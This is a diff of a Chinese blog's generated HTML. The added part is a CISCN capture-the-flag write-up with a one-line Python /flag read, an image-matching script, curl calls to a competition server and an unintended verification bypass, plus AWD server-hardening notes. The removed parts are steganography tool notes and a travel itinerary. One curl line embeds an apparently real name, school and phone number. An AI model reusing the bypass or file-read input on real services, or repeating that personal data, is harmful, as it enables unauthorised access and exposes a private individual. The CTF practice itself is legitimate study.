+        <h1 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="27日-签到卡"><a href="#27日-签到卡" class="headerlink" title="27日_签到卡"></a>27日_签到卡</h3><p>输入print(open(‘&#x2F;flag’).read())直接出</p>
+<h3 id="27日-被加密的生产流量"><a href="#27日-被加密的生产流量" class="headerlink" title="27日_被加密的生产流量"></a>27日_被加密的生产流量</h3><p>追踪tcp流</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/Clip_20230528_175756.png" alt="QQ截图20230527231429"></p>
+<p>中间那串是base32</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/QQ%E6%88%AA%E5%9B%BE20230527231611.jpg" alt="QQ截图20230527231611"></p>
+<h3 id="27日-国粹"><a href="#27日-国粹" class="headerlink" title="27日_国粹"></a>27日_国粹</h3><p>真想来几句国粹</p>
+<p>附件的第三张图片是维吉尼亚的表的一部分，a是纵坐标，k是横纵坐标，标点得到flag，问gpt搞了个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="comment">#表</span></span><br><span class="line"><span class="comment"># 打开图片</span></span><br><span class="line">im1 = Image.<span class="built_in">open</span>(<span class="string">&quot;ccc.png&quot;</span>)</span><br><span class="line"><span class="comment"># 获取图片大小</span></span><br><span class="line">width1, height1 = im1.size</span><br><span class="line"></span><br><span class="line">top = <span class="number">0</span></span><br><span class="line">bottom = height1 / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">wid = <span class="number">53</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width1//wid):</span><br><span class="line">    left = i*wid+<span class="number">1</span></span><br><span class="line">    right=(i+<span class="number">1</span>)*wid</span><br><span class="line">    test=im1.crop((left, top, right, bottom))</span><br><span class="line">    test.save(<span class="string">&quot;./test/&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">&quot;a.png&quot;</span>)</span><br><span class="line"><span class="comment"># 获取图片大小</span></span><br><span class="line">width2, height2 = im2.size</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width2//wid):</span><br><span class="line">    left = i*wid+<span class="number">1</span></span><br><span class="line">    right=(i+<span class="number">1</span>)*wid</span><br><span class="line">    test=im2.crop((left, top, right, bottom))</span><br><span class="line">    test.save(<span class="string">&quot;./a/&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im3 = Image.<span class="built_in">open</span>(<span class="string">&quot;k.png&quot;</span>)</span><br><span class="line"><span class="comment"># 获取图片大小</span></span><br><span class="line">width3, height3 = im3.size</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width3//wid):</span><br><span class="line">    left = i*wid+<span class="number">1</span></span><br><span class="line">    right=(i+<span class="number">1</span>)*wid</span><br><span class="line">    test=im3.crop((left, top, right, bottom))</span><br><span class="line">    test.save(<span class="string">&quot;./k/&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>(<span class="params">path1,path2</span>):</span><br><span class="line">    <span class="comment"># 读取图片</span></span><br><span class="line">    img1 = cv2.imread(path1)</span><br><span class="line">    img2 = cv2.imread(path2)</span><br><span class="line">    <span class="comment"># 将图片调整为8*8大小</span></span><br><span class="line">    img1 = cv2.resize(img1, (<span class="number">8</span>, <span class="number">8</span>))</span><br><span class="line">    img2 = cv2.resize(img2, (<span class="number">8</span>, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转化为灰度图</span></span><br><span class="line">    gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算均值</span></span><br><span class="line">    avg1 = np.mean(gray1)</span><br><span class="line">    avg2 = np.mean(gray2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算哈希值</span></span><br><span class="line">    hash1 = (gray1 &gt; avg1).reshape(<span class="number">1</span>, -<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    hash2 = (gray2 &gt; avg2).reshape(<span class="number">1</span>, -<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算相似度</span></span><br><span class="line">    similarity = <span class="number">1</span> - np.mean(hash1 != hash2)</span><br><span class="line">    <span class="keyword">return</span>  similarity</span><br><span class="line"></span><br><span class="line">xy=<span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">x=[]</span><br><span class="line">y=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">341</span>)):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        imga=<span class="string">&#x27;./a/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        imgc=<span class="string">&#x27;./test/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(a)</span><br><span class="line">        <span class="keyword">if</span> judge(imga,imgc)==<span class="number">1.0</span>:</span><br><span class="line">            y.append(-a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        imgk=<span class="string">&#x27;./k/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        imgc=<span class="string">&#x27;./test/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(k)</span><br><span class="line">        <span class="keyword">if</span> judge(imgk,imgc)==<span class="number">1.0</span>:</span><br><span class="line">            x.append(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(&#x27;(&#123;&#125;,&#123;&#125;)&#x27;.format(x,y))</span></span><br><span class="line">    <span class="comment"># xy.write(&#x27;&#123;&#125; &#123;&#125;\n&#x27;.format(x,y))</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax1 = fig.add_subplot(<span class="number">111</span>)</span><br><span class="line">ax1.set_title(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">ax1.scatter(x, y, c=<span class="string">&#x27;b&#x27;</span>, marker=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="comment"># plt.show()</span></span><br><span class="line">plt.savefig(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./assets/image-20230326161742255.png" alt="image-20230326161742255"></p>
-<h4 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h4><ul>
-<li><p>单张图片</p>
-<p><strong>WaterMark</strong></p>
-<p><a target="_blank" rel="noopener" href="https://www.onlinedown.net/soft/1216474.htm">https://www.onlinedown.net/soft/1216474.htm</a></p>
-</li>
-<li><p>两张图片</p>
-<p> <strong>BlindWaterMark</strong></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/chishaxie/BlindWaterMark.git">https://github.com/chishaxie/BlindWaterMark.git</a></p>
-</li>
-</ul>
-<h4 id="Zsteg"><a href="#Zsteg" class="headerlink" title="Zsteg"></a>Zsteg</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt insatll zsteg</span><br></pre></td></tr></table></figure>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/flag.png" alt="flag"></p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="27日-基于国密SM2算法的密钥分发"><a href="#27日-基于国密SM2算法的密钥分发" class="headerlink" title="27日_基于国密SM2算法的密钥分发"></a>27日_基于国密SM2算法的密钥分发</h3><p>写这个wp的时候环境已经没了，不知道明天会不会开放</p>
+<p>大概写一下思路</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#登录获取id</span></span><br><span class="line">curl -d <span class="string">&quot;name=%E9%AB%98%E6%97%AD%E4%B8%9C&amp;school=%E6%AD%A6%E6%B1%89%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6&amp;phone=18293814176&quot;</span> http://123.56.244.196:30629/api/login</span><br><span class="line"></span><br><span class="line"><span class="comment">#传公钥</span></span><br><span class="line">curl -d <span class="string">&quot;id=471acaa5-4651-42d9-8a8f-4a466f256019&amp;publicKey=8EF998E54661B98AFE90D483892C79738622C381A9D40BEF3E02752AF4B62CAB4399AEFE38968412A5870B7CC72459FDBE22B0ED6A5C569BE283D43695B9E8E5&quot;</span> http://123.56.244.196:30629/api/allkey</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg -a file</span><br><span class="line"><span class="comment">#基础使用</span></span><br></pre></td></tr></table></figure>
+<p>这里有一个非预期，随便给服务器传一个quantumString，然后访问&#x2F;api&#x2F;search，就会看到quantumStringSever，复制这一串再提交一次，就会显示验证通过，直接得到flag</p>
+<p>没保存截图，直接看一下history</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/QQ%E6%88%AA%E5%9B%BE20230527234546.jpg" alt="QQ截图20230527234546"></p>
+<h3 id="27日-Sign-in-passwd"><a href="#27日-Sign-in-passwd" class="headerlink" title="27日_Sign_in_passwd"></a>27日_Sign_in_passwd</h3><p>base换表</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/05/QQ%E6%88%AA%E5%9B%BE20230527234700.jpg" alt="QQ截图20230527234700"></p>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsteg -e <span class="string">&quot;lsb&quot;</span> file -&gt; file</span><br><span class="line"><span class="comment">#提取文件</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h4><h3 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h3><h4 id="认识jpg文件格式"><a href="#认识jpg文件格式" class="headerlink" title="认识jpg文件格式"></a>认识jpg文件格式</h4><h4 id="Stegdetect"><a href="#Stegdetect" class="headerlink" title="Stegdetect"></a>Stegdetect</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Stegdetect.exe -tjopi -s 10.0 png</span><br></pre></td></tr></table></figure>
-
-<p>有图形化界面</p>
-<h4 id="F5"><a href="#F5" class="headerlink" title="F5"></a>F5</h4><p><strong><a target="_blank" rel="noopener" href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract 1.jpg (-p 123456)</span><br></pre></td></tr></table></figure>
-
-<h4 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h4><p><strong><a target="_blank" rel="noopener" href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a></strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x *</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">outguess -k 12345 -d hidden.txt 1.jpg 2.jpg</span><br><span class="line">outguess -k 12345 -r 2.jpg out.txt</span><br><span class="line">outguess -r 2.jpg out.txt</span><br></pre></td></tr></table></figure>
-
-<h4 id="jphs"><a href="#jphs" class="headerlink" title="jphs"></a>jphs</h4><p><a target="_blank" rel="noopener" href="https://www.scanwith.com/JPHS_for_Windows_download.htm#google_vignette">Download for Free JPHS for Windows 0.5 (scanwith.com)</a></p>
-<h4 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h4><p>安装软件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install steghide</span><br></pre></td></tr></table></figure>
-
-<p>将隐藏信息从载体中分离出来</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf test.jpg -p 123456</span><br><span class="line"><span class="comment">#-sf  参数</span></span><br><span class="line"><span class="comment">#test.jpg  图片名称</span></span><br><span class="line"><span class="comment">#-p 密码参数，后面空格跟密码，无密码可不加参数，回车就好</span></span><br></pre></td></tr></table></figure>
-
-
-<p>将文件隐藏到载体中</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide embed -cf test.jpg -ef secret.txt -p 123456</span><br></pre></td></tr></table></figure>
-
-<p>有时候不知道密码，就需要用<strong>Stegseek</strong>来爆破</p>
-<h4 id="Stegseek"><a href="#Stegseek" class="headerlink" title="Stegseek"></a>Stegseek</h4><p><a target="_blank" rel="noopener" href="https://github.com/RickdeJager/stegseek/releases">https://github.com/RickdeJager/stegseek/releases</a></p>
-<p>-run-as&#x3D;rootVeraCrypt安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install stegseek_0.6-1.deb</span><br></pre></td></tr></table></figure>
-
-<p>用法</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">time stegseek file dic.txt</span><br><span class="line"><span class="comment">#需要字典</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="SilentEye"><a href="#SilentEye" class="headerlink" title="SilentEye"></a>SilentEye</h4><p><a target="_blank" rel="noopener" href="https://www.downtu.com/soft/88597.html">SilentEye中文版</a></p>
-<p>有图形化界面</p>
-<h3 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h3><h4 id="空间轴"><a href="#空间轴" class="headerlink" title="空间轴"></a>空间轴</h4><p>由于 GIF 的动态特性，由一帧帧的图片构成，所以每一帧的图片，多帧图片间的结合，都成了隐藏信息的一种载体。</p>
-<p><strong>拆分</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">gilFileName = <span class="string">&#x27;glance.gif&#x27;</span>        <span class="comment"># 将准备好的gif 打开</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(gilFileName)</span><br><span class="line">pngDir = gilFileName[:-<span class="number">4</span>]        <span class="comment"># 获取 .gif 前面的字符，也就是名字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pngDir):</span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;如果没有重名的文件夹，就生成这个文件夹来存放图片&#x27;&#x27;&#x27;</span></span><br><span class="line">	os.mkdir(pngDir)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\SharkChili\\Desktop\\misc_demo\\glance.gif&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        current = im.tell()  </span><br><span class="line">        im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">        im.save(pngDir + <span class="string">&#x27;\\&#x27;</span> + <span class="built_in">str</span>(current) + <span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>拼接</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">convert [参数1] &#123;输入文件名&#125; [输出文件名]		<span class="comment">#拼接</span></span><br><span class="line"><span class="comment">#[参数1]：+append 横向拼接 -append 纵向拼接 </span></span><br><span class="line"><span class="comment">#&#123;输入文件名&#125;：要拼接的图片，每张图片名之间用空格分隔，支持正则表达式，有先后顺序</span></span><br><span class="line"> </span><br><span class="line">montage &#123;输入文件名&#125; -tile [a*b] -geometry [a*b+0+0] -background [<span class="comment">#+RGBA颜色] [输出文件名] </span></span><br><span class="line"><span class="comment">#-tile [a*b]：a*b，类似于表格，每行每列放几张图</span></span><br><span class="line"><span class="comment">#-geometry [a*b+0+0]：a*b指上边网格每格多大，可以省略，按最大的算，+0+0是图片间距。</span></span><br><span class="line"><span class="comment">#-background [#+RGBA颜色] 背景颜色</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h4><p>GIF 文件每一帧间的时间间隔也可以作为信息隐藏的载体，隐藏具体方式需具体分析，可以通过 <strong>identify</strong> 命令清晰的打印出每一帧的时间间隔。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format <span class="string">&quot;%s %T \n&quot;</span> gif  	<span class="comment">#格式：帧序号 间隔</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="Mp3Stego"><a href="#Mp3Stego" class="headerlink" title="Mp3Stego"></a>Mp3Stego</h3><p><a target="_blank" rel="noopener" href="http://www.petitcolas.net/steganography/mp3stego/">http://www.petitcolas.net/steganography/mp3stego/</a></p>
-<p>隐藏</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line"><span class="comment">#hidden_text.txt 隐藏的文本</span></span><br><span class="line"><span class="comment">#pass 密码</span></span><br><span class="line"><span class="comment">#svega.wav 原文件</span></span><br><span class="line"><span class="comment">#svega_stego.mp3 生成的文件</span></span><br></pre></td></tr></table></figure>
-
-<p>提取</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode -X -P pass svega_stego.mp3</span><br></pre></td></tr></table></figure>
-
-<h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><p><a target="_blank" rel="noopener" href="http://www.downza.cn/soft/199171.html">Audacity中文版</a></p>
-<p>波形图</p>
-<p>频谱图</p>
-<h3 id="Deepsound"><a href="#Deepsound" class="headerlink" title="Deepsound"></a>Deepsound</h3><p><a target="_blank" rel="noopener" href="https://www.pcsoft.com.cn/soft/202006.html">DeepSound下载</a></p>
-<h3 id="MMSSTV"><a href="#MMSSTV" class="headerlink" title="MMSSTV"></a>MMSSTV</h3><h3 id="SilentEye-1"><a href="#SilentEye-1" class="headerlink" title="SilentEye"></a>SilentEye</h3>
       
     </div>
     
@@ -559,11 +246,11 @@
 
 
   
-    <article id="post-西安三日游" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-awd" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2023/06/01/%E8%A5%BF%E5%AE%89%E4%B8%89%E6%97%A5%E6%B8%B8/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.227Z" itemprop="datePublished">2023-06-01</time>
+      <a href="/2023/06/01/awd/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.208Z" itemprop="datePublished">2023-06-01</time>
 </a>
     </div>
   
@@ -572,616 +259,134 @@
       <input type="hidden" class="isFancy" />
     
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="西安三日游"><a href="#西安三日游" class="headerlink" title="西安三日游"></a>西安三日游</h1><h2 id="4-30"><a href="#4-30" class="headerlink" title="4.30"></a>4.30</h2><p>13点左右吃饭</p>
-<p>乘坐4号线（西安站上车，和平门下车）到达和平门</p>
-<p>和平门骑行2公里到达南门</p>
-<p>（去skp)</p>
-<p>南门上城墙，租自行车，骑半圈，北门下车（7公里多）</p>
-<p>步行至广仁寺</p>
-<p>步行至洒金桥</p>
-<p>吃</p>
-<p>洒金桥乘坐1号线到北大街转2号线到钟楼下车</p>
-<p>看钟楼鼓楼</p>
-<p>去回民街</p>
-<h2 id="5-1"><a href="#5-1" class="headerlink" title="5.1"></a>5.1</h2><h2 id="5-2"><a href="#5-2" class="headerlink" title="5.2"></a>5.2</h2>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
+      <header class="article-header">
+        
   
-</article>
-
-
-
-
-
-
-
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/01/awd/">
+        awd
+        
+      </a>
+    </h1>
   
-    <article id="post-流量分析" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/06/01/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.226Z" itemprop="datePublished">2023-06-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
+
+      </header>
+      
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h2><h3 id="查看协议"><a href="#查看协议" class="headerlink" title="查看协议"></a>查看协议</h3><p><code>统计(Statistics)</code>-&gt;<code>协议分级(Protocol Hierarchy)</code></p>
-<p><img src="/./assets/image-20230327221435002.png" alt="image-20230327221435002"></p>
-<h3 id="查看地址"><a href="#查看地址" class="headerlink" title="查看地址"></a>查看地址</h3><p><code>统计(Statistics)</code>-&gt;<code> 会话(Conversations)</code></p>
-<p><img src="/./assets/image-20230327221941879.png" alt="image-20230327221941879"></p>
-<h3 id="统计信息长度"><a href="#统计信息长度" class="headerlink" title="统计信息长度"></a>统计信息长度</h3><p><code>统计(Statistics)</code>-&gt;<code> 分组长度(Packet Lengths)</code></p>
-<p><img src="/./assets/image-20230327222416825.png" alt="image-20230327222416825"></p>
-<h3 id="常用过滤"><a href="#常用过滤" class="headerlink" title="常用过滤"></a>常用过滤</h3><ul>
-<li><p>过滤ip，如源IP或者目标x.x.x.x：</p>
-<p><code>ip.src eq xxxx or ip.dst eq xxxx </code>或者<code> ip.addr eq xxxx</code></p>
-</li>
-<li><p>过滤端口：</p>
-</li>
+        <h1 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h1><h2 id="加固阶段"><a href="#加固阶段" class="headerlink" title="加固阶段"></a>加固阶段</h2><h3 id="用ssh登录的服务器"><a href="#用ssh登录的服务器" class="headerlink" title="用ssh登录的服务器"></a>用ssh登录的服务器</h3><p>通常是<code>Finallshell</code>或者<code>XShell+Sxfpt</code></p>
+<p>登录之后修改ssh的登录密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br><span class="line"><span class="comment">#先输入旧密码，再输入两次新密码</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="打包备份网站目录"><a href="#打包备份网站目录" class="headerlink" title="打包备份网站目录"></a>打包备份网站目录</h3><p>一般是&#x2F;var&#x2F;www&#x2F;html&#x2F;目录，但是在www目录下没有执行的权限，如果执行打包命令会失败，所以我们进入html目录下面进行打包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 4.tar.gz *</span><br></pre></td></tr></table></figure>
+
+<h3 id="修改数据库密码"><a href="#修改数据库密码" class="headerlink" title="修改数据库密码"></a>修改数据库密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u xxx -p xxxx   <span class="comment">#进入数据库</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> PASSWORD = password(‘123456’); <span class="comment">#修改密码</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h3><ul>
+<li>备份指定的多个数据库</li>
 </ul>
-<p>​				<code>	tcp.port eq(等于) 80 or udp.port eq 80</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u xxx -p xxx --databases DB1 DB2 &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure>
+
+<p>无 lock tables 权限的解决方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u xxx -p xxx --all-databases --skip-lock-tables &gt; /tmp/db.sql</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li>过滤MAC:</li>
+<li>恢复备份（在 MySQL 终端下执行）</li>
 </ul>
-<p>​				<code>	eth.dst == MAC地址</code></p>
-<ul>
-<li><p>协议过滤:</p>
-<p>直接在Filter框中直接输入协议名即可，http udp dns</p>
-</li>
-<li><p>http模式过滤</p>
-</li>
